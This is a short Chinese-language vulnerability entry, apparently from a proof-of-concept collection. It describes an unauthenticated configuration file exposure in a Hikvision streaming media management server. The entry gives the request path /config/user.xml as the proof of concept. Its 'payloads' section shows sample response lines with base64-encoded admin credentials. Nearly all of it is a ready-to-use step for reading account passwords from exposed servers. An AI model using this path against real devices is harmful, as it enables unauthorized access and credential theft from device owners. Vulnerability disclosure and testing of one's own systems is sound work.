# Hikvision 流媒体管理服务器 user.xml 账号密码泄漏漏洞

## 漏洞描述
Hikvision 流媒体管理服务器配置文件未做鉴权，攻击者通过漏洞可以获取网站账号密码

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登陆页面

![image-20220519172629739](images/202205191726829.png)

POC

```
/config/user.xml
```


## Payloads
```
/config/user.xml
```
```
<user name="YWRtaW4=" password="MTIzNDU="/>
```
```
<user name="admin" password="MTIzNDU="/>
```
